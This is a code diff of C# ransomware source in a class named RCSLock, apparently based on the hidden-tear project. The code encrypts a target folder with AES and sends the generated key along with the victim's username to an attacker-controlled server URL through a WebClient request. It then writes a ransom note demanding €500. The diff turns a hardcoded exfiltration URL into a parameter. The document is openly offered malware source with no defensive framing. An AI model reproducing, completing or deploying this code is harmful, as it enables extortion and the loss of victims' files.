@@ -19,13 +19,6 @@ namespace Wexy_Server
 {
     public class RCSLock
     {
-        //Url to send encryption password and computer info
-        //string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
-        string targetURL = "http://192.168.1.19:8081/rcslock/unlock.php?key=";
-        string userName = Environment.UserName;
-        string computerName = System.Environment.MachineName.ToString();
-        string userDir = "C:\\Users\\";
-
         //AES encryption algorithm
         public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
         {
@@ -71,9 +64,8 @@ namespace Wexy_Server
         //Sends created password target location
         public void SendPassword(string password,string serverUrl)
         {
-            //string info = computerName + "-" + userName + " " + password;
+            string userName = Environment.UserName;
             string info = userName + "-" + password;
-            //var fullUrl = targetURL + info;
             var fullUrl = serverUrl + info;
             var conent = new System.Net.WebClient().DownloadString(fullUrl);
 
@@ -127,8 +119,6 @@ namespace Wexy_Server
         public void startAction(string folderpath,string serverUrl)
         {
             string password = CreatePassword(15);
-            //string path = "\\Desktop\\test";
-            //string startPath = userDir + userName + path;
             SendPassword(password,serverUrl);
             encryptDirectory(folderpath, password);
             messageCreator(folderpath);
@@ -139,6 +129,7 @@ namespace Wexy_Server
         public void messageCreator(string folderpath)
         {
             string path = folderpath + "\\IMPORTANT MESSAGE.txt";
+            File.Delete(path);
             string[] lines = { "Your files have been locked with a ransonware.","If you want to unlock your files , you must pay €500 to this account" };
             System.IO.File.WriteAllLines(path, lines);
         }
